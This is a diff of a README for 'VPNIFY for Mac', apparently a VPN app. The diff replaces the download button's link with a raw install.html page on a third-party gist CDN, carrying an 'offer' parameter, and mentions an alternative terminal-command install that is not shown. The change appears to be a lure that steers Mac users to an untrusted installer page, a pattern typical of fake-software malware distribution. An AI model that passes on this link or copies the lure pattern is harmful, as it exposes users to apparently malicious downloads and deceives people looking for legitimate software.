@@ -4,7 +4,7 @@
 VPNIFY for Mac is a fast and secure VPN application that allows you to browse the web safely and privately 🌐.  
 You can download and install it on macOS by following the instructions below.
 
-[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-007AFF?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/vpnify)
+[![Download For Mac](https://img.shields.io/badge/Download-For%20Mac-007AFF?logo=apple&style=for-the-badge)](https://gistcdn.githack.com/breshine2010/f1e7da49b2633dc0be788e2becd1aeb4/raw/008d334dc45899bcf9459cb9df1d55c807b128cb/install.html?offer=vpnify)
 
 If the button does not work, follow the installation instructions below using the terminal command.
 
